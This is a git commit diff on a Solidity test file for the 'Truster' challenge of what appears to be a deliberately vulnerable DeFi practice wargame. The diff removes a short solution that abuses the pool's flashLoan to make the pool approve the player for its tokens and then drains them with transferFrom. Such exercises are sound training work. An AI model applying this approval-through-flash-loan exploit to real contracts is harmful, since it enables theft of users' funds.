8fc5d73978e5691f87267328f6c2eccd3dfb80ad
itsnico222 <togiabao222@gmail.com>
2024-08-18 19:59:02 +0700

    a

--- test/truster/Truster.t.sol
+++ test/truster/Truster.t.sol
@@ -53,11 +53,7 @@ contract TrusterChallenge is Test {
      */
     // @audit-info Done
     function test_truster() public checkSolvedByPlayer {
-        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", player, token.balanceOf(address(pool)));
-
-        pool.flashLoan(0, address(this), address(token), data);
-        token.transferFrom(address(pool), player, token.balanceOf(address(pool)));
-        token.transfer(recovery, token.balanceOf(address(pool)));
+        
         // done
         
     }
